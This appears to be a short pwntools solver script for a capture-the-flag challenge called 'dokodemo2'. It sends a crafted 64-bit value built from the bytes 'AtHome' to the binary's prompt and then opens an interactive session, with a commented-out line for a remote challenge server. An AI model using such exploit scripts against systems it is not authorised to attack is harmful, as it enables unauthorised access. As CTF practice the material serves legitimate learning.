from pwn import *
context.log_level='debug'
context.terminal=["open-wsl.exe","-c"]

p = process('./dokodemo2')

#p = remote("mrh1s.top", 23002)

payload = u64(p16(0) + b'AtHome')

#gdb.attach(p)
p.sendlineafter('Ring the bell if you want to get in.', str(payload))

p.interactive()
